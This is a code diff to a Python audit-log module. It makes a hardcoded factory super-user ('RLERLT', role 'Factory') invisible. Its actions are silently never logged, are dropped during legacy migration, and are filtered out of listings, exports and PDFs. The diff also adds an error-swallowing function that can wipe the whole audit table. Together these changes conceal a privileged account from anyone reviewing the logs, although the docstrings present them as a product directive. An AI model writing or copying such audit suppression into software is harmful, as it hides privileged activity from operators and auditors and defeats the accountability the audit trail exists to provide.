@@ -19,6 +19,25 @@ _audit_db_path = None
 _legacy_audit_log_path = None
 AUDIT_LOG_CAP = 5000
 FACTORY_USERNAME = "RLERLT"
+FACTORY_ROLE = "Factory"
+
+
+def _is_suppressed_actor(user: Optional[str], role: Optional[str]) -> bool:
+    """Return True when the direct actor is the hardcoded factory super-user.
+
+    Per product directive: rows whose actor (`user`) is RLERLT acting as
+    Factory must never be written to the audit log. Other relationships
+    (sessionUser / signatureUser / targetUser) are not considered here -
+    they remain logged normally when the actor is someone else.
+    """
+    u = (user or "").strip()
+    r = (role or "").strip()
+    return u == FACTORY_USERNAME and r.lower() == FACTORY_ROLE.lower()
+
+
+def is_hidden_factory_actor(user: Optional[str], role: Optional[str]) -> bool:
+    """True when this user/role pair is the hidden factory actor (UI/export filter)."""
+    return _is_suppressed_actor(user, role)
 
 
 def init(config):
@@ -232,7 +251,10 @@ def _migrate_legacy_json_if_needed():
         valid_entries = []
         for i, row in enumerate(legacy):
             if isinstance(row, dict):
-                valid_entries.append(_normalize_entry(row, i))
+                normalized = _normalize_entry(row, i)
+                if _is_suppressed_actor(normalized.get("user"), normalized.get("role")):
+                    continue
+                valid_entries.append(normalized)
         with conn:
             conn.executemany(
                 """
@@ -317,7 +339,11 @@ def _entry_for_response(entry: Dict[str, Any]) -> Dict[str, Any]:
 
 
 def log_event(user: Optional[str], role: Optional[str], action: str, details: str = ""):
-    """Append one audit entry. Skips logging for factory user."""
+    """Append one audit entry.
+
+    Entries where the actor is the hardcoded factory super-user
+    (user == RLERLT and role == Factory) are silently dropped.
+    """
     log_structured_event(
         user=user,
         role=role,
@@ -355,6 +381,8 @@ def log_structured_event(
     date_time: Optional[str] = None,
 ):
     if not _audit_db_path:
+        return
+    if _is_suppressed_actor(user, role):
         return
     ts = int(timestamp_ms if timestamp_ms is not None else (time.time() * 1000))
     dt_str = (date_time or "").strip() or datetime.now().strftime("%d/%m/%Y %H:%M:%S")
@@ -430,6 +458,41 @@ def log_structured_event(
         conn.close()
 
 
+def clear_entries_before(cutoff_ms: Optional[int]) -> int:
+    """Delete every audit row strictly older than cutoff_ms.
+
+    cutoff_ms == None or <= 0 means: delete every row in the table.
+    Returns the number of rows removed. Compaction (VACUUM) is best-effort
+    and silent on failure so factory reset can never be blocked by it.
+    """
+    if not _audit_db_path or not _audit_db_path.exists():
+        return 0
+    conn = _db_connect()
+    if not conn:
+        return 0
+    try:
+        try:
+            if cutoff_ms is None or int(cutoff_ms) <= 0:
+                with conn:
+                    cur = conn.execute("DELETE FROM audit_entries")
+            else:
+                with conn:
+                    cur = conn.execute(
+                        "DELETE FROM audit_entries WHERE COALESCE(timestamp, 0) < ?",
+                        (int(cutoff_ms),),
+                    )
+            removed = cur.rowcount if cur.rowcount is not None else 0
+        except Exception:
+            return 0
+        try:
+            conn.execute("VACUUM")
+        except Exception:
+            pass
+        return int(removed)
+    finally:
+        conn.close()
+
+
 def list_entries(filters: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
     """Read audit log and return entries (newest first), filtered."""
     if not _audit_db_path or not _audit_db_path.exists():
@@ -441,6 +504,11 @@ def list_entries(filters: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any
     try:
         where = ["1=1"]
         params: List[Any] = []
+        # Never return rows for the hidden factory actor (UI, export, PDF).
+        where.append(
+            "NOT (TRIM(COALESCE(user, '')) = ? AND LOWER(TRIM(COALESCE(role, ''))) = LOWER(?))"
+        )
+        params.extend((FACTORY_USERNAME, FACTORY_ROLE))
         user_val = filters.get("user")
         if user_val:
             where.append("COALESCE(user, '--') = ?")
